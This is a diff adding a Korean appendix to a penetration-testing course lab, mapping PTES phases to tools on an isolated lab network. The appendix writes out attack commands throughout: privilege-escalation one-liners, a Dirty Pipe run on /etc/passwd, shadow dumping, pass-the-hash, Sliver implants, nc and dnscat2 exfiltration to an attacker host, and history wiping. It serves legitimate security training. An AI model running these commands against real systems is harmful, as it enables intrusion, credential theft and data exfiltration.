@@ -720,3 +720,751 @@ graph LR
 
 **학생 액션**: Trojan package 분석.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 14 종합 모의해킹 / PTES 7단계 전 과정)
+
+> 이 부록은 lab `attack-adv-ai/week14.yaml` (15 step + multi_task) 의 모든 명령을
+> 실제 PTES 단계와 도구 매트릭스로 매핑한다. Week 01~13 의 모든 기법이 한 시나리오에
+> 통합되며, 학생이 격리 망 (10.20.30.0/24 + Juice Shop 192.168.0.100) 을 대상으로
+> Pre-engagement → Recon → Exploit → Post-Ex → Reporting 전 과정을 직접 수행한다.
+
+### lab step → 도구·PTES 매핑 표
+
+| step | PTES 단계 | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK |
+|------|----------|----------|---------------------|--------|
+| s1 | Pre-engagement | 범위·RoE 정의 | text editor, OSCP/PTES 템플릿 | - |
+| s2 | Information Gathering | 네트워크 정찰 | nmap, masscan, rustscan, dnsrecon | T1595 |
+| s3 | Vulnerability Analysis | 웹 취약점 스캔 | nikto, nuclei, ffuf, gobuster, sqlmap | T1190 |
+| s4 | Threat Modeling | 방화벽·IPS 평가 | nmap -sA, hping3, fragroute | T1046 |
+| s5 | Vulnerability Analysis | SIEM 평가 | nmap -sV, wazuh-agent fingerprint | T1046 |
+| s6 | Exploitation | 웹 초기 접근 | sqlmap, BurpSuite, jwt_tool, exploit-db | T1190 |
+| s7 | Post-Exploitation | 시스템 정보 수집 | LinPEAS, sysinfo, ip a, arp, netstat | T1082 / T1083 |
+| s8 | Post-Exploitation | 권한 상승 열거 | LinPEAS, GTFOBins, pspy, linux-exploit-suggester | T1068 |
+| s9 | Post-Exploitation | 측면 이동 | impacket, crackmapexec, evil-winrm, BloodHound | T1021 |
+| s10 | Post-Exploitation | 데이터 유출 | tar+gzip+age, rclone, dnscat2, iodine | T1041 / T1048 |
+| s11 | Reporting | CVSS v3.1 평가 | cvss-calculator, FIRST.org rubric, NVD | - |
+| s12 | Reporting | 공격 체인 다이어그램 | mermaid, draw.io, ATT&CK Navigator | - |
+| s13 | Reporting | 방어 권고 우선순위화 | OWASP / NIST / CIS Controls 매핑 | - |
+| s14 | Cleanup | 환경 정리 | shred, history -c, log integrity | T1070 |
+| s15 | Reporting | Executive Summary | dradis, serpico, pwndoc | - |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion 가 PTES 1-5단계 자동 수행 | 다중 | 다중 |
+
+### 학생 환경 준비 (PTES 전 단계 도구 풀세트)
+
+```bash
+# === [s2] 정찰 ===
+sudo apt install -y nmap masscan dnsrecon dnsenum whatweb sublist3r
+# rustscan (빠른 포트 스캐너)
+wget -q https://github.com/RustScan/RustScan/releases/latest/download/rustscan_2.1.1_amd64.deb
+sudo dpkg -i rustscan_*.deb
+
+# theHarvester (OSINT 이메일/서브도메인)
+sudo apt install -y theharvester
+
+# amass (서브도메인 enum)
+sudo snap install amass
+
+# === [s3] 웹 취약점 ===
+sudo apt install -y nikto sqlmap wfuzz gobuster ffuf
+# nuclei (templated scanner)
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+nuclei -update-templates
+
+# Burp Suite Community
+wget https://portswigger.net/burp/releases/download?product=community&type=Linux -O burp.sh
+chmod +x burp.sh && sudo ./burp.sh
+
+# wpscan (WordPress)
+sudo apt install -y wpscan
+wpscan --update
+
+# OWASP ZAP
+sudo apt install -y zaproxy
+
+# === [s4] 방화벽 우회 ===
+sudo apt install -y hping3 fragroute scapy
+pip install --user scapy
+
+# === [s6] Exploitation ===
+sudo apt install -y exploitdb
+searchsploit --update
+
+# Metasploit Framework
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall && sudo ./msfinstall
+
+# jwt_tool — JWT 분석/공격
+git clone https://github.com/ticarpi/jwt_tool /tmp/jwt_tool
+cd /tmp/jwt_tool && pip install -r requirements.txt
+python3 jwt_tool.py --help
+
+# === [s7-s8] Post-Exploitation 열거 ===
+# LinPEAS / WinPEAS
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+
+# linux-exploit-suggester
+git clone https://github.com/mzet-/linux-exploit-suggester /tmp/les
+
+# pspy — 무권한 프로세스 모니터링
+curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 > /tmp/pspy64
+chmod +x /tmp/pspy64
+
+# GTFOBins (offline copy)
+git clone https://github.com/GTFOBins/GTFOBins.github.io /tmp/gtfobins
+
+# === [s9] 측면 이동 ===
+sudo apt install -y impacket-scripts
+# CrackMapExec → NetExec (후속)
+pip install --user netexec
+
+# evil-winrm
+gem install evil-winrm
+
+# BloodHound
+sudo apt install -y bloodhound neo4j
+neo4j console &
+# 사용: bloodhound (GUI) + bloodhound-python collector
+
+# Sliver C2
+curl https://sliver.sh/install | sudo bash
+sliver-server
+
+# === [s10] 데이터 유출 ===
+sudo apt install -y rclone age curl
+# dnscat2 (DNS 터널)
+git clone https://github.com/iagox86/dnscat2 /tmp/dnscat2
+cd /tmp/dnscat2/server && bundle install
+# iodine (DNS 터널 native)
+sudo apt install -y iodine
+
+# === [s11] CVSS ===
+pip install --user cvss
+
+# === [s12] Diagram ===
+sudo apt install -y graphviz
+npm install -g @mermaid-js/mermaid-cli
+
+# ATT&CK Navigator (web)
+git clone https://github.com/mitre-attack/attack-navigator /tmp/nav
+cd /tmp/nav/nav-app && npm install && npm run start &
+
+# === [s15] 보고서 ===
+# Dradis Community
+docker run -p 3000:3000 -d dradisframework/community
+
+# Serpico
+git clone https://github.com/SerpicoProject/Serpico /tmp/serpico
+cd /tmp/serpico && bundle install
+ruby serpico.rb &
+
+# pwndoc
+docker run -p 5252:8443 ghcr.io/pwndoc/pwndoc:latest
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: nmap — 5단계 정찰 깊이 (Step 2)
+
+```bash
+# === Stage 1: Host discovery ===
+nmap -sn 10.20.30.0/24                            # ping sweep
+nmap -PE -PP -PM -sn 10.20.30.0/24                # ICMP echo + timestamp + netmask
+masscan -p1-65535 10.20.30.0/24 --rate=10000      # 빠른 포트 sweep
+
+# === Stage 2: 포트 + 서비스 ===
+nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon-1k
+# -sV 서비스 버전, -sC default scripts, --open 열린 포트만, -oA 모든 형식 저장
+
+# === Stage 3: 전체 포트 (느림) ===
+nmap -sS -p- --min-rate=1000 -T4 10.20.30.80 -oA /tmp/recon-full
+# 또는 rustscan 으로 빠르게 발견 후 nmap 으로 deep
+rustscan -a 10.20.30.80 -- -sV -sC -oA /tmp/recon-rs
+
+# === Stage 4: NSE 깊이 ===
+nmap --script vuln 10.20.30.80 -oA /tmp/recon-vuln
+nmap --script smb-vuln-* -p 445 10.20.30.80
+nmap --script http-* -p 80,443 10.20.30.80
+
+# === Stage 5: OS fingerprint + Traceroute ===
+nmap -O --traceroute 10.20.30.80 -oA /tmp/recon-os
+# OS detection: Linux 5.15 / Windows Server 2019
+
+# 결과 정리
+xsltproc /tmp/recon-1k.xml -o /tmp/recon-1k.html       # HTML report
+
+# DNS recon
+dnsrecon -d corp.example -t std,axfr,brt
+amass enum -d corp.example -active
+
+# OSINT 이메일
+theHarvester -d corp.example -b google,linkedin -l 500
+```
+
+권장 PTES 정찰 순서: ① masscan 빠른 sweep → ② nmap top-1000 → ③ rustscan 전체 포트 → ④ nmap NSE vuln → ⑤ 발견된 서비스별 specialized (sqlmap/nuclei/wpscan).
+
+#### 도구 2: nuclei + ffuf + sqlmap — 웹 취약점 (Step 3)
+
+```bash
+# 기본 — 모든 template
+nuclei -u http://10.20.30.80:3000
+
+# 카테고리별
+nuclei -u http://10.20.30.80:3000 -t cves/                 # CVE 만
+nuclei -u http://10.20.30.80:3000 -t exposures/             # 시크릿/설정 노출
+nuclei -u http://10.20.30.80:3000 -t vulnerabilities/       # 일반 취약점
+nuclei -u http://10.20.30.80:3000 -t misconfiguration/      # 잘못된 설정
+nuclei -u http://10.20.30.80:3000 -t default-logins/        # 기본 자격증명
+nuclei -u http://10.20.30.80:3000 -t takeovers/             # 서브도메인 인수
+
+# severity 필터
+nuclei -u http://10.20.30.80:3000 -severity critical,high
+nuclei -u http://10.20.30.80:3000 -severity high,critical -markdown-export /tmp/nuclei-report
+
+# 다중 target
+echo -e "10.20.30.80\n10.20.30.100\n10.20.30.1" > targets.txt
+nuclei -l targets.txt -t cves/ -o /tmp/scan.txt
+
+# 사용자 정의 template
+cat > custom.yaml << 'YML'
+id: jwt-none-alg
+info:
+  name: JWT none algorithm allowed
+  severity: high
+http:
+  - method: GET
+    path: ["{{BaseURL}}/api/profile"]
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
+    matchers:
+      - type: word
+        words: ["admin", "Admin"]
+YML
+nuclei -u http://10.20.30.80:3000 -t custom.yaml
+
+# === ffuf — 디렉터리 fuzzing ===
+ffuf -w /usr/share/wordlists/dirb/common.txt \
+  -u http://10.20.30.80:3000/FUZZ \
+  -mc 200,301,302,403 -fc 404 \
+  -o /tmp/ffuf.json -of json
+
+# 파라미터 fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "http://10.20.30.80:3000/api/users?FUZZ=admin" \
+  -fs 1234   # 정상 응답 크기
+
+# === sqlmap ===
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=*" \
+  --batch --random-agent --threads=4
+
+sqlmap -u "http://10.20.30.80:3000/login" \
+  --data="email=test&password=test" \
+  --dbs --batch
+
+sqlmap -u "..." --dump -T users --batch        # 테이블 dump
+sqlmap -u "..." --os-shell                     # OS shell (가능 시)
+
+# === BurpSuite — Manual Proxy ===
+# Configure browser: SOCKS proxy 127.0.0.1:8080 + import Burp CA
+# Intercept → Send to Repeater → Send to Intruder (fuzzing) → Send to Decoder
+```
+
+#### 도구 3: LinPEAS — Post-Exploitation 자동 열거 (Step 7-8)
+
+```bash
+# 침투한 호스트에서 다운로드 + 실행
+curl -s 10.20.30.201:8000/linpeas.sh | bash    # 한 줄
+# 또는
+wget 10.20.30.201:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
+
+# 모드 선택
+/tmp/lp.sh -a                  # all checks (오래 걸림)
+/tmp/lp.sh -s                  # superfast
+/tmp/lp.sh -e                  # extreme — 모든 explanation
+
+# 색상 코드:
+# 빨강+노랑 (95%): 매우 위험, 즉시 권한 상승 가능
+# 빨강 (50-95%): 흥미로운 발견
+# 일반: 정보
+
+# 핵심 출력
+# [+] Operative system  -> Linux 5.15.0
+# [+] System information -> kernel 5.15, distro Ubuntu 22.04
+# [+] PATH variable -> /usr/local/bin (writable!)  ★ 권한 상승 vector
+# [+] SUID files -> /usr/bin/find  ★ GTFOBins find 으로 권한 상승
+# [+] Sudo permission -> (ALL : ALL) NOPASSWD: /usr/bin/vim  ★ vim ! /bin/sh
+# [+] Capabilities -> cap_setuid /bin/python3  ★ python3 setuid(0)
+# [+] Cron jobs -> /etc/crontab 의 /opt/script.sh world-writable
+
+# === GTFOBins ===
+# offline copy 검색
+grep -rn "find" /tmp/gtfobins/_gtfobins/find.md | head -20
+
+# 예: SUID find → root shell
+find . -exec /bin/sh -p \; -quit
+
+# 예: sudo NOPASSWD vim → root shell
+sudo vim -c ':!/bin/sh'
+
+# 예: cap_setuid python3
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# === pspy — sudo / cron 모니터링 ===
+/tmp/pspy64 -i 1000 -p
+# 1초 간격, process + parent 표시
+# CMD: UID=0  PID=12345  /opt/backup.sh   ★ root 가 주기적으로 실행 → race or 변조
+
+# === linux-exploit-suggester ===
+/tmp/les/linux-exploit-suggester.sh
+# Highly probable: CVE-2022-0847 Dirty Pipe (kernel 5.8 ~ 5.16.10)
+# Probable:        CVE-2021-4034 PwnKit (polkit)
+# Less probable:   CVE-2021-3156 Sudo Baron Samedi
+
+# 검증
+gcc -o dirtypipe dirtypipe.c
+./dirtypipe /etc/passwd 0 0
+# 결과: /etc/passwd 의 root password 필드를 임의 값으로 변경
+```
+
+#### 도구 4: impacket / NetExec — 측면 이동 (Step 9)
+
+```bash
+# === 자격증명 dump (Linux) ===
+sudo cat /etc/shadow > /tmp/shadow.txt
+hashcat -m 1800 /tmp/shadow.txt rockyou.txt --force
+
+# 메모리 dump (mimipenguin / 3snake)
+git clone https://github.com/huntergregal/mimipenguin /tmp/mp
+sudo /tmp/mp/mimipenguin.sh
+# Found: ccc:Pa$$w0rd123 in process gnome-keyring
+
+# === SMB enum (impacket) ===
+impacket-smbclient -no-pass guest@10.20.30.100
+impacket-secretsdump 'corp.example/admin:password@10.20.30.100'
+# Output:
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# (NT hash → pass-the-hash)
+
+# Pass-the-Hash
+impacket-psexec -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' admin@10.20.30.100
+
+# === NetExec (CrackMapExec 후속) ===
+nxc smb 10.20.30.0/24 -u users.txt -p Password123 --continue-on-success
+nxc smb 10.20.30.100 -u admin -p Password123 --shares
+nxc smb 10.20.30.100 -u admin -p Password123 -x 'whoami /priv'
+nxc winrm 10.20.30.100 -u admin -p Password123 -x 'systeminfo'
+
+# === evil-winrm ===
+evil-winrm -i 10.20.30.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+# *Evil-WinRM* PS C:\> whoami /all
+
+# === BloodHound — AD path 분석 ===
+bloodhound-python -d corp.example -u admin -p Password123 -ns 10.20.30.1 -c All
+neo4j console &
+bloodhound &
+# ZIP 파일 import → 좌측 "Shortest paths to Domain Admins"
+
+# === Sliver C2 ===
+sliver-server
+> generate --mtls 10.20.30.201:443 --save /tmp/implant
+> sessions
+> use <session-id>
+> shell
+> upload /tmp/implant.exe C:\Windows\Temp\update.exe
+> execute -o whoami
+```
+
+#### 도구 5: CVSS v3.1 계산 — 평가 (Step 11)
+
+```bash
+python3 << 'PY'
+from cvss import CVSS3
+
+# 예: SQL injection (Authentication Required, Network)
+v1 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H')
+print(f"SQLi: Base={v1.base_score} Severity={v1.severities()[0]}")
+# Base=8.8 Severity=High
+
+# JWT none alg (Network, No Auth, Low UI)
+v2 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H')
+print(f"JWT-none: Base={v2.base_score} Severity={v2.severities()[0]}")
+# Base=10.0 Severity=Critical
+
+# Local PrivEsc (Local, Low PR, No UI)
+v3 = CVSS3('CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H')
+print(f"PrivEsc: Base={v3.base_score} Severity={v3.severities()[0]}")
+# Base=7.8 Severity=High
+
+# IDOR (Network, Low PR)
+v4 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N')
+print(f"IDOR: Base={v4.base_score} Severity={v4.severities()[0]}")
+# Base=6.5 Severity=Medium
+
+# XSS Stored (Network, Required UI, Some impact)
+v5 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N')
+print(f"XSS-stored: Base={v5.base_score} Severity={v5.severities()[0]}")
+# Base=5.4 Severity=Medium
+
+# Temporal score (exploit available + remediation 부재)
+print(f"SQLi temporal: {CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C').temporal_score}")
+PY
+
+# Vector 의미 (FIRST.org rubric)
+# AV  Attack Vector:        N/A/L/P (Network/Adjacent/Local/Physical)
+# AC  Attack Complexity:    L/H
+# PR  Privileges Required:  N/L/H
+# UI  User Interaction:     N/R
+# S   Scope:                U/C (Unchanged/Changed)
+# C   Confidentiality:      H/L/N
+# I   Integrity:            H/L/N
+# A   Availability:         H/L/N
+
+# Top 5 정렬 (보고서용)
+python3 << 'PY'
+findings = [
+  ("SQL injection /search", 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'),
+  ("JWT none alg",          'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'),
+  ("Stored XSS comment",    'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N'),
+  ("LFI in /file",          'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N'),
+  ("Sudo NOPASSWD vim",     'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'),
+]
+from cvss import CVSS3
+ranked = sorted(((n, CVSS3(v).base_score, v) for n,v in findings), key=lambda x: -x[1])
+for r in ranked: print(f"{r[1]:.1f} {r[0]} -> {r[2]}")
+PY
+```
+
+#### 도구 6: mermaid + ATT&CK Navigator — 다이어그램 (Step 12)
+
+```bash
+# Mermaid CLI
+cat > /tmp/chain.mmd << 'M'
+sequenceDiagram
+  participant A as Attacker
+  participant W as Web (10.20.30.80)
+  participant S as SIEM (10.20.30.100)
+  participant F as Firewall (10.20.30.1)
+
+  Note over A: PTES 1-3: Recon, Vulnerability Analysis
+  A->>W: nmap -sV (T1595)
+  A->>W: nuclei -t cves/ (T1190)
+
+  Note over A,W: PTES 4: Exploitation
+  A->>W: sqlmap /search?q=* (T1190 SQLi)
+  W-->>A: JWT admin token
+
+  Note over A: PTES 5: Post-Exploitation
+  A->>W: webshell upload (T1505.003)
+  W->>W: LinPEAS → SUID find (T1068)
+  A->>W: privilege escalation → root
+
+  Note over W,S: Lateral Movement
+  W->>S: SSH key reuse (T1021.004)
+  S-->>A: Wazuh API credentials
+
+  Note over A: Exfiltration
+  S->>A: tar -czf - logs | nc 10.20.30.201 4444 (T1041)
+M
+
+mmdc -i /tmp/chain.mmd -o /tmp/chain.png
+mmdc -i /tmp/chain.mmd -o /tmp/chain.svg
+
+# Mermaid Kill Chain
+cat > /tmp/killchain.mmd << 'M'
+graph LR
+  R[Reconnaissance<br/>nmap, masscan, theHarvester]
+  W[Weaponization<br/>msfvenom, custom exploit]
+  D[Delivery<br/>phishing, web]
+  E[Exploitation<br/>SQLi, JWT none]
+  I[Installation<br/>webshell, cron backdoor]
+  C[Command & Control<br/>Sliver, dnscat2]
+  A[Actions on Objectives<br/>data exfil, ransomware]
+
+  R --> W --> D --> E --> I --> C --> A
+  style E fill:#ff6666
+  style A fill:#ff6666
+M
+
+# === ATT&CK Navigator JSON ===
+cat > /tmp/navigator-layer.json << 'JSON'
+{
+  "name": "Pentest Lab Coverage",
+  "versions": {"attack": "14", "navigator": "4.9.4", "layer": "4.5"},
+  "domain": "enterprise-attack",
+  "techniques": [
+    {"techniqueID": "T1595", "score": 100, "color": "#00ff00", "comment": "nmap recon - covered"},
+    {"techniqueID": "T1190", "score": 100, "color": "#00ff00", "comment": "SQLi - covered"},
+    {"techniqueID": "T1068", "score": 100, "color": "#00ff00", "comment": "SUID privesc"},
+    {"techniqueID": "T1021.004", "score": 80, "color": "#ffaa00", "comment": "SSH key reuse"},
+    {"techniqueID": "T1041", "score": 100, "color": "#00ff00", "comment": "data exfil over C2"}
+  ]
+}
+JSON
+# Navigator URL 로드: http://localhost:4200 → Open Existing Layer
+```
+
+#### 도구 7: 모의해킹 보고서 (Dradis / pwndoc, Step 15)
+
+```bash
+# === Dradis — 협업 pentest 보고서 ===
+docker run -p 3000:3000 -d dradisframework/community
+
+# UI: http://localhost:3000
+# Project 생성 → Methodology → 각 finding 추가
+# - Title / Description / Risk / CVSS / Recommendation
+# - Evidence (screenshot / payload / output)
+# - Affected hosts
+
+# 보고서 export
+# Dradis → Export → Word / HTML / PDF
+
+# === pwndoc (PwnDoc) ===
+docker compose up -d   # MongoDB + pwndoc
+# UI: http://localhost:5252
+# vulnerabilities → audits → templates 모두 분리
+
+# === Executive Summary 작성 양식 (s15) ===
+cat > /tmp/pentest_executive_summary.txt << 'EOF'
+=========================================================
+PENETRATION TEST — EXECUTIVE SUMMARY
+=========================================================
+Engagement: Internal Network Security Assessment
+Scope:      10.20.30.0/24 (web, secu, siem, attacker)
+Period:     2026-04-25 ~ 2026-05-02
+Methodology: PTES v1.0 + OWASP WSTG v4.2 + MITRE ATT&CK
+
+OVERALL RISK: HIGH
+
+KEY FINDINGS (TOP 5)
+-----
+1. CRITICAL  CVSS 10.0  JWT none algorithm allowed (web:3000 /api/login)
+   - Impact: Complete authentication bypass, admin takeover
+   - Recommendation: Disable 'none' alg, enforce HS256/RS256 verification
+
+2. CRITICAL  CVSS 9.8   SQL injection in /rest/products/search?q=
+   - Impact: Database extraction, RCE via UDF
+   - Recommendation: Parameterized queries, ORM, WAF rule
+
+3. HIGH      CVSS 7.8   Sudo NOPASSWD vim → root (web)
+   - Impact: Local privilege escalation to root
+   - Recommendation: sudoers 정책 재정의, GTFOBins 차단
+
+4. HIGH      CVSS 7.5   Wazuh API default credentials (siem)
+   - Impact: SIEM tampering, log integrity loss
+   - Recommendation: 자격증명 회전, MFA, IP allowlist
+
+5. MEDIUM    CVSS 6.5   Stored XSS in JuiceShop comments
+   - Impact: Session hijacking, admin token theft
+   - Recommendation: CSP header, input sanitization, output encoding
+
+ATT&CK COVERAGE
+---------------
+Reconnaissance(T1595)  → Initial Access(T1190)  → PrivEsc(T1068)
+  → Lateral Movement(T1021)  → Exfiltration(T1041)
+Detection coverage in Wazuh: 35% (8/23 techniques alerted)
+
+DEFENSIVE RECOMMENDATIONS (priority)
+-----
+Short-term (≤7 days):
+  - Patch JuiceShop to latest, disable JWT 'none'
+  - Reset all default credentials, enforce password policy
+  - Enable Wazuh 100501-100503 DNS rules
+
+Mid-term (≤30 days):
+  - WAF deployment (ModSecurity OWASP CRS)
+  - sudoers review + GTFOBins blocklist
+  - SIEM rule tuning (reduce 35% → 80% coverage)
+
+Long-term (≤90 days):
+  - SAST/DAST in CI/CD pipeline (semgrep + ZAP)
+  - Network segmentation (VLAN per tier)
+  - Annual pentest + quarterly red team
+
+CLEANUP CONFIRMATION
+--------------------
+- All test accounts removed
+- All uploaded files removed (shred -u)
+- All cron entries restored
+- All log entries documented for SIEM tuning
+EOF
+
+cat /tmp/pentest_executive_summary.txt
+```
+
+### 점검 / 공격 / 방어 흐름 (PTES 7단계 매핑)
+
+#### Phase A — Pre-engagement + Recon (s1·s2·s3·s4·s5)
+
+```bash
+# RoE 정의
+cat > /tmp/pentest_scope.txt << 'EOF'
+=== Penetration Test — Rules of Engagement ===
+Scope:        10.20.30.0/24
+Out of scope: 10.20.30.201 (Bastion - 자기 시스템)
+Allowed:      Active scanning, exploitation, lateral movement, exfiltration
+Forbidden:    DoS, ransomware execution, real data destruction
+Window:       2026-05-02 09:00 ~ 18:00 KST
+Notification: 비상 시 ccc@corp.example
+Communication: Slack #pentest-2026
+Liability:    Sample lab environment, no real PII
+EOF
+
+# 정찰
+masscan -p1-65535 10.20.30.0/24 --rate=10000 -oG /tmp/masscan.gnmap
+nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon
+nikto -h http://10.20.30.80 -o /tmp/nikto.txt
+nuclei -u http://10.20.30.80:3000 -severity high,critical -o /tmp/nuclei.txt
+```
+
+#### Phase B — Exploitation + Post-Ex (s6·s7·s8·s9·s10)
+
+```bash
+# 1. 웹 초기 접근 (Juice Shop)
+sqlmap -u "http://10.20.30.80:3000/rest/user/login" --data='{"email":"x","password":"y"}' \
+  --batch --random-agent --threads=4
+
+# admin token (JWT none)
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op","password":"x"}' \
+  http://10.20.30.80:3000/rest/user/login
+
+# 2. 시스템 enum (admin 으로 webshell upload 후)
+curl -s 10.20.30.201:8000/linpeas.sh | bash > /tmp/linpeas.out
+grep -E "PWNED|95%" /tmp/linpeas.out
+
+# 3. Privilege escalation
+# 발견: sudo NOPASSWD /usr/bin/vim
+sudo vim -c ':!/bin/sh'
+
+# 4. 측면 이동 — SSH key reuse
+ssh-keygen -y -f /home/ccc/.ssh/id_rsa  # 키 추출
+ssh -i /home/ccc/.ssh/id_rsa ccc@10.20.30.100   # SIEM 으로
+
+# 5. 데이터 유출
+tar -czf - /var/ossec/data | age -r age1abc... | nc 10.20.30.201 4444
+# 또는 dnscat2
+dnscat2-client.bin --secret=secret123 attacker.tunnel.example
+```
+
+#### Phase C — Reporting + Cleanup (s11·s12·s13·s14·s15)
+
+```bash
+# 1. CVSS 평가 (Top 5)
+python3 cvss-rank.py findings.csv > /tmp/cvss-ranked.txt
+
+# 2. ATT&CK 다이어그램 (mermaid)
+mmdc -i /tmp/chain.mmd -o /tmp/chain.png
+mmdc -i /tmp/killchain.mmd -o /tmp/killchain.png
+
+# 3. 권고 문서 작성
+cat > /tmp/recommendations.md << 'EOF'
+## 단기 (≤7일)
+- JWT none 차단 (jose 라이브러리 update)
+- 모든 default 자격증명 회전
+- WAF 룰 OWASP CRS 활성화
+## 중기 (≤30일)
+- sudoers 재정의 + GTFOBins blocklist
+- SIEM rule 80% coverage 도달
+## 장기 (≤90일)
+- SAST/DAST CI/CD 통합
+- Network segmentation (VLAN per tier)
+EOF
+
+# 4. cleanup
+shred -vfz -u /tmp/linpeas.sh /tmp/linpeas.out /tmp/exfil.tar.gz
+history -c && history -w
+sudo rm -rf /tmp/sliver-implant /tmp/dnscat2
+
+# logs (cleanup record)
+cat > /tmp/cleanup-log.txt << EOF
+$(date): Removed 12 test artifacts
+- /tmp/linpeas* (3 files)
+- /tmp/sliver-implant (binary + config)
+- /tmp/exfil.tar.gz
+- ~/.ssh/known_hosts (테스트 항목)
+- crontab restored to original
+- /etc/sudoers.d/test-user removed
+EOF
+
+# 5. Executive Summary (s15)
+# (위 도구 7 의 양식 참조)
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 가 한 번에 PTES 1-5단계 자동 수행:
+
+1. **plan**: scope → recon → vuln scan → fw analysis → siem assess
+2. **execute**: nmap + nuclei + nikto + hping3 + wazuh fingerprint
+3. **synthesize**: 각 단계 발견 통합 → ATT&CK 매핑 5개 + 다음 phase plan
+
+### 도구 비교표 — PTES 단계별 도구 선택
+
+| PTES 단계 | 1순위 도구 | 2순위 (보완) | 사용 조건 |
+|---------|-----------|-------------|----------|
+| Pre-engagement | text editor + RoE 템플릿 | Dradis / pwndoc | 협업 시 협업 도구 |
+| Recon (passive) | theHarvester + amass | Maltego CE | OSINT 만 |
+| Recon (active) | nmap + masscan | rustscan | 빠른 결과 필요 시 rustscan |
+| Web Scan | nuclei + nikto | OWASP ZAP / Burp | template 부족 시 ZAP |
+| Vuln Analysis | searchsploit + NVD | CVSS calculator | exploit DB 검색 |
+| Exploitation | metasploit + sqlmap | manual + Burp Repeater | 정밀 제어 시 manual |
+| Post-Ex Linux | LinPEAS + pspy + GTFOBins | linux-exploit-suggester | kernel CVE 시 |
+| Post-Ex AD | BloodHound + impacket + nxc | mimikatz + adidnsdump | Windows 환경 |
+| C2 / Lateral | Sliver / Empire | Cobalt Strike (commercial) | OSS 우선 |
+| Exfiltration | tar+age+nc | dnscat2 / iodine | 방화벽 강할 때 DNS |
+| Reporting | Dradis / pwndoc | Markdown + pandoc | 단순 시 markdown |
+| Cleanup | shred + history -c | log rotate manual | 주의: 운영 영향 |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "OSCP 스타일 24h" | nmap + nuclei + LinPEAS + manual + pencil | 시간 압박 + cheatsheet |
+| "내부망 깊이 audit" | nmap + nessus 시뮬 + custom nuclei + BloodHound | depth 우선 |
+| "External attack surface" | amass + cloud_enum + nuclei + httpx | OSINT 위주 |
+| "Web app 깊이" | Burp + sqlmap + nuclei custom + jwt_tool | manual + auto 조합 |
+| "AD 도메인" | bloodhound + impacket + nxc + secretsdump | path 분석 |
+| "Cloud (AWS)" | Pacu + Prowler + ScoutSuite + Stratus | week13 의 도구 재사용 |
+| "Mobile app" | MobSF + Frida + objection (week15 weight) | 모바일 전용 |
+| "보고서 협업" | Dradis CE + Slack + Notion | 팀 작업 |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: `/tmp/pentest_scope.txt` 작성 (scope/out-of-scope/window/forbidden/communication 5요소)
+- [ ] s2: nmap top-1000 + 전체 포트 + NSE vuln 3 단계, 활성 호스트 ≥3
+- [ ] s3: nuclei + nikto + ffuf 3 도구 모두 사용, finding ≥5
+- [ ] s4: hping3 또는 nmap -sA 로 firewall 분석, IPS evasion 시도 1 이상
+- [ ] s5: Wazuh API 포트 + 버전 + default cred 시도 결과 명시
+- [ ] s6: SQLi 또는 JWT none 으로 admin token 획득, 증거 (response) 첨부
+- [ ] s7: LinPEAS 실행, SUID/sudo/cron/cap 4가지 enum 결과
+- [ ] s8: 권한 상승 vector 3개 이상 식별, 1개 실증 (root shell)
+- [ ] s9: SSH key reuse 또는 NetExec 으로 다른 호스트 access
+- [ ] s10: tar+gzip+nc 또는 dnscat2 데이터 유출 PoC
+- [ ] s11: cvss 라이브러리로 Top 5 finding 점수 + vector 모두 산출
+- [ ] s12: mermaid 또는 ATT&CK Navigator 로 공격 체인 시각화
+- [ ] s13: 단기/중기/장기 권고 각 3개 이상, OWASP/NIST 매핑
